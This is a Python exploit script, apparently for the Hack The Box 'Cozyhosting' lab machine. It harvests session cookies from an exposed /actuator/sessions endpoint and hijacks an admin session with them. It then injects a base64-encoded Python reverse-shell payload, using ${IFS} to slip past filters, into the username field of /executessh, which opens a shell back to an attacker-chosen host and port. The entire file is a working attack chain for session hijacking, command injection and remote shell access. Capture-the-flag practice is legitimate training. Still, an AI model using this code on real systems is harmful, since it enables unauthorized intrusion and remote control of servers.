import requests
import argparse
import random
from base64 import b64encode
import json

parser = argparse.ArgumentParser(description='Reverse shell spawner for "Cozyhosting" machine on HTB')
parser.add_argument('--lhost', action='store', required=True)
parser.add_argument('--lport', action='store', required=True)
host = parser.parse_args()

r = requests.get('http://cozyhosting.htb/actuator/sessions')
sessions = json.loads(r.text)

pyshell = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host.lhost}",{host.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
pyshell = b64encode(pyshell.encode())
payload = "rce||echo${IFS}'" + pyshell.decode() + "'|base64${IFS}-d|python3;#"

for token in sessions.keys():
        print(f'[*] Trying cookie: {token}')
        headers={'Cookie':f'JSESSIONID={token}'}
        r = requests.get('http://cozyhosting.htb/admin', headers={'Cookie':f'JSESSIONID={token}'})
        if r.status_code == 200:
                break

print(f"[!] Found valid session cookie: {token}\n[*] Sending RCE payload via POST request to /executessh, ensure you have an active listener.")
requests.post('http://cozyhosting.htb/executessh', headers=headers, data={'host':'rce','username':payload}, allow_redirects=0)